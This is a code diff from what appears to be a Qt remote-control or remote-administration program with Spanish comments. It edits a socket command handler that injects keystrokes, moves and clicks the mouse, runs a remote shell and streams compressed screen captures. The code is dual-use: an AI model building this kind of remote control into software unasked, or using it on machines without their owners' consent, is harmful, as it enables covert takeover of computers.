@@ -222,9 +222,47 @@ void MainWindow::llegadaDatos() {
     QStringList parametros =  datos.split("|@|");
     if(parametros[0] == "t")
     {
+        int i;
+        for(i=0;i<parametros.size();i++)
+        {
+            #ifdef Q_WS_WIN
+                 enviarTecla(parametros[i].toInt());
+            #endif
+        }
+
+        return;
+    }
+    if (parametros[0] == "derp")
+    {
+        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
         #ifdef Q_WS_WIN
-             enviarTecla(parametros[1].toInt());
+        hacerClickDerechoP();
         #endif
+        return;
+    }
+    if (parametros[0] == "izqp")
+    {
+        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
+        #ifdef Q_WS_WIN
+        hacerClickIzquierdoP();
+        #endif
+        return;
+    }
+    if (parametros[0] == "ders")
+    {
+        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
+        #ifdef Q_WS_WIN
+        hacerClickDerechoS();
+        #endif
+        return;
+    }
+    if (parametros[0] == "izqs")
+    {
+        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
+        #ifdef Q_WS_WIN
+        hacerClickIzquierdoS();
+        #endif
+        return;
     }
     if(parametros[0] == "shell"){ //shell remoto
         QString salidaShell;
@@ -372,34 +410,7 @@ void MainWindow::llegadaDatos() {
     {   
         util.escribirSocket(obtenerInformacionSistema(),&socket);
     }
-    if (parametros[0] == "derp")
-    {
-        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
-        #ifdef Q_WS_WIN
-        hacerClickDerechoP();
-        #endif
-    }
-    if (parametros[0] == "izqp")
-    {
-        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
-        #ifdef Q_WS_WIN
-        hacerClickIzquierdoP();
-        #endif
-    }
-    if (parametros[0] == "ders")
-    {
-        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
-        #ifdef Q_WS_WIN
-        hacerClickDerechoS();
-        #endif
-    }
-    if (parametros[0] == "izqs")
-    {
-        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
-        #ifdef Q_WS_WIN
-        hacerClickIzquierdoS();
-        #endif
-    }
+
 
 }
 void MainWindow::moverPuntero(int x, int y)
@@ -661,9 +672,6 @@ void paralelo::procesarImagen(QImage imagen2, int calidad, QTcpSocket *socket)
 {
     this->socketDentro = socket;
     int i,j;
-    buffer = new QBuffer(&bytes);
-    connect(buffer,SIGNAL(bytesWritten(qint64)),this,SLOT(datosEscritos())); //Cuando los datos se terminen de escribir en el bufer llamamos a datosEscritos()
-    buffer->open(QIODevice::ReadWrite);
     QImage imagen3(imagen2.width(),imagen2.height(), QImage::Format_RGB32); //Creamos una imagen nueva donde pintaremos los pixeles diferentes
     imagen3.fill(QColor(255, 0, 255).rgb()); //Inicializamos la imagen a fucsia para que envie la primera completa
     for(i=0;i<imagen1->width();i++) //Recorremos toda la imagen
@@ -676,6 +684,8 @@ void paralelo::procesarImagen(QImage imagen2, int calidad, QTcpSocket *socket)
             }
         }
     }
+    buffer = new QBuffer(&bytes);
+    buffer->open(QIODevice::ReadWrite);
     imagen3.save(buffer,"jpg",calidad); //Guardamos la imagen resultante en un bufer de memoria en formato jpg
     *imagen1 = imagen2; //La captura actual pasa a ser captura anterior
     sincroniza++; //LLebamos la cuenta de cuantas capturas vamos haciendo
@@ -684,6 +694,7 @@ void paralelo::procesarImagen(QImage imagen2, int calidad, QTcpSocket *socket)
         imagen1->fill(QColor(0,0,0).rgba());
         sincroniza = 0;
     }
+    datosEscritos();
 }
 
 void paralelo::datosEscritos()
@@ -693,7 +704,8 @@ void paralelo::datosEscritos()
     QByteArray comprimido = qCompress(bytes,9);
     array.setNum(comprimido.size());
     util.escribirSocketDatos(array,this->socketDentro);
-    this->socketDentro->waitForBytesWritten(1000);
+    this->socketDentro->waitForBytesWritten();
     util.escribirSocketDatos(comprimido,this->socketDentro);
+    delete buffer;
     //socketEscritorio.waitForBytesWritten(-1);
 }
